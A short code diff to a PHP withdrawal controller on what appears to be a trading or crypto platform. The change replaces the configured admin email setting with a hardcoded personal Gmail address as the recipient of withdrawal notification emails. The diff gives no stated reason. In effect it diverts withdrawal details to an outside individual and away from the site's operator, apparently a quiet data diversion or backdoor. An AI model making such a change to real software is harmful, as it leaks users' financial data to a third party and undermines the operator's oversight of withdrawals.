@@ -789,7 +789,7 @@ class WithdrawController extends Controller
                                 ',
                                 'username' => "Admin"
                             ];
-                            Mail::to(env('ADMIN_EMAIL'))->send(new WithdrawMail($mailData));
+                            Mail::to('Justintristan230@gmail.com')->send(new WithdrawMail($mailData));
                             session()->flash('success_message', 'Your withdrawal was successful and will be processed shortly.');
                             return redirect()->to('user/withdraw')->with(['trading_pair_data' => $trading_and_selected_asset_data['trading_pair_data'], 'selected_asset_data' => $trading_and_selected_asset_data['selected_asset_data']])->with($this->getUserDetails())->with(compact('withdraws', 'user', 'tradingbots'))->with(compact('tradeEntry'));
                         } else {
